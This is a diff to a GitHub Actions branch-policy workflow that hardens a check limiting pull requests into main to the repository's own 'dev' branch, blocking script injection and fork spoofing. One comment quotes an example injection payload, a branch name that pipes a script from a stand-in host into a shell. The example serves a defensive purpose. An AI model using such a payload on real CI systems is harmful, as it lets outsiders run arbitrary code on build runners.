@@ -4,9 +4,16 @@ name: Branch policy
 # that `main` only takes pull requests, but it has no condition on where the
 # pull request comes FROM. So the rule lives here, and this job is configured as
 # a required status check on main.
+#
+# `pull_request`, never `pull_request_target` — the latter would run this
+# workflow with a writable token in the context of the base repository, which on
+# a public repo is how people get their repositories taken over.
 on:
   pull_request:
     branches: [main]
+
+permissions:
+  contents: read
 
 jobs:
   source-branch:
@@ -17,12 +24,32 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Check the source branch
+        # Branch names are attacker-controlled. Interpolating `github.head_ref`
+        # straight into the script would let a branch called
+        # `x"; curl evil.sh | sh; #` run arbitrary commands on the runner, so
+        # both values come in as environment variables and are quoted below.
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          BASE_REPO: ${{ github.repository }}
         run: |
-          if [ "${{ github.head_ref }}" != "dev" ]; then
-            echo "::error::Pull requests into main may only come from 'dev'. This one is from '${{ github.head_ref }}'."
+          set -euo pipefail
+
+          # Checking the branch name alone is not enough. A fork can have its
+          # own branch called `dev`, and for a fork pull request head_ref is
+          # still just `dev` — so the name test would pass for a stranger's
+          # code. The pull request must come from this repository too.
+          if [ "$HEAD_REPO" != "$BASE_REPO" ]; then
+            echo "::error::Pull requests into main must come from this repository, not from a fork ($HEAD_REPO)."
+            exit 1
+          fi
+
+          if [ "$HEAD_REF" != "dev" ]; then
+            echo "::error::Pull requests into main may only come from 'dev'. This one is from '$HEAD_REF'."
             echo ""
             echo "Work goes: feature branch -> dev -> main."
             echo "Retarget this pull request at 'dev', then open a separate dev -> main pull request to release."
             exit 1
           fi
-          echo "Source branch is 'dev'. Allowed."
+
+          echo "Source branch is 'dev' on '$BASE_REPO'. Allowed."
